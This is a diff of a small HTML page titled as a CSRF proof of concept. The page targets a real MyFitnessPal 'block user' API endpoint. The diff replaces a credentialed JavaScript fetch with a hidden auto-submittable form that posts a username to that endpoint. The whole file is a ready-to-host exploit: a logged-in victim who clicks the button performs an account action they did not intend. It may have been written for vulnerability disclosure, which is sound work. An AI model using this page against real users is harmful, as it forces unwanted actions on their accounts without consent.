@@ -1,23 +1,21 @@
 <!doctype html>
-<html>
-  <body>
-    <h2>CSRF PoC — Block User</h2>
-    <button onclick="sendCSRF()">Click to send request</button>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC — Block User (click to run)</title>
+</head>
+<body>
+  <h3>CSRF PoC — Block User</h3>
+  <p>Click the button below to send a POST to MyFitnessPal (uses form-encoded body).</p>
 
-    <script>
-      function sendCSRF() {
-        fetch("https://www.myfitnesspal.com/api/services/blocked_users/block", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({"username":"MyFitnessPal"}),
-          credentials: "include" // include cookies
-        })
-        .then(r => r.text())
-        .then(t => console.log("Response:", t))
-        .catch(e => console.error(e));
-      }
-    </script>
-  </body>
+  <form action="https://www.myfitnesspal.com/api/services/blocked_users/block" method="POST">
+    <!-- change value if needed -->
+    <input type="hidden" name="username" value="MyFitnessPal">
+    <button type="submit">Send PoC (click to run)</button>
+  </form>
+
+  <noscript>
+    <p><em>JavaScript disabled — this is still a pure-HTML form PoC.</em></p>
+  </noscript>
+</body>
 </html>
